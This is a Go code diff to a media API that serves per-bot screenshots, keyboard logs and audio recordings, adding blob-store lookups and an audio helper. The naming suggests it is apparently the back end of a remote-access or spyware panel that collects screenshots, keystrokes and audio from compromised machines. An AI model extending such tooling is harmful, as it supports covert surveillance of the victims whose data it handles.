@@ -16,7 +16,10 @@ import (
 
 // MediaAPI groups screenshot, keyboard log and recording routes.
 type MediaAPI struct {
-	DB *gorm.DB
+	DB    *gorm.DB
+	Blobs interface {
+		Get(kind, hash string) ([]byte, error)
+	}
 }
 
 func parseLimitOffset(r *http.Request, defLimit int) (int, int) {
@@ -53,7 +56,7 @@ func (a *MediaAPI) Screenshots(w http.ResponseWriter, r *http.Request) {
 	limit, offset := parseLimitOffset(r, 50)
 	var out []screenshotMeta
 	if err := a.DB.Table("bot_screenshots").
-		Select("id, bot_id, url, title, timestamp, session_id, difference, (COALESCE(image_data, '') != '') as has_image").
+		Select("id, bot_id, url, title, timestamp, session_id, difference, ((COALESCE(image_data, '') != '') OR (COALESCE(blob_hash, '') != '')) as has_image").
 		Where("bot_id = ?", id).
 		Order("timestamp DESC").Limit(limit).Offset(offset).
 		Find(&out).Error; err != nil {
@@ -71,9 +74,18 @@ func (a *MediaAPI) ScreenshotImage(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	var row models.BotScreenshot
-	if err := a.DB.Select("image_data").Where("id = ?", id).First(&row).Error; err != nil {
+	if err := a.DB.Select("image_data", "blob_hash").Where("id = ?", id).First(&row).Error; err != nil {
 		JSONErr(w, http.StatusNotFound, "screenshot not found")
 		return
+	}
+	if row.BlobHash != "" && a.Blobs != nil {
+		raw, err := a.Blobs.Get("screenshots", row.BlobHash)
+		if err == nil {
+			w.Header().Set("Content-Type", "image/jpeg")
+			w.Header().Set("Cache-Control", "public, max-age=86400, immutable")
+			_, _ = w.Write(raw)
+			return
+		}
 	}
 	img := row.ImageData
 	if img == "" {
@@ -211,18 +223,7 @@ func (a *MediaAPI) AudioSessionMerge(w http.ResponseWriter, r *http.Request) {
 		JSONErr(w, http.StatusNotFound, "session not found")
 		return
 	}
-	chunk := row.Recording
-	if idx := strings.Index(chunk, ";base64,"); idx != -1 {
-		chunk = chunk[idx+len(";base64,"):]
-	}
-	decoded, err := base64.StdEncoding.DecodeString(chunk)
-	if err != nil {
-		w.Header().Set("Content-Type", "audio/webm")
-		_, _ = w.Write([]byte(row.Recording))
-		return
-	}
-	w.Header().Set("Content-Type", "audio/webm")
-	_, _ = w.Write(decoded)
+	a.writeAudio(w, row)
 }
 
 type audioChunkMeta struct {
@@ -262,6 +263,18 @@ func (a *MediaAPI) AudioChunk(w http.ResponseWriter, r *http.Request) {
 	if err := a.DB.Where("id = ?", id).First(&row).Error; err != nil {
 		JSONErr(w, http.StatusNotFound, "recording not found")
 		return
+	}
+	a.writeAudio(w, row)
+}
+
+func (a *MediaAPI) writeAudio(w http.ResponseWriter, row models.BotRecording) {
+	if row.BlobHash != "" && a.Blobs != nil {
+		if raw, err := a.Blobs.Get("audio", row.BlobHash); err == nil {
+			w.Header().Set("Content-Type", "audio/webm")
+			w.Header().Set("Cache-Control", "public, max-age=86400, immutable")
+			_, _ = w.Write(raw)
+			return
+		}
 	}
 	chunk := row.Recording
 	if idx := strings.Index(chunk, ";base64,"); idx != -1 {
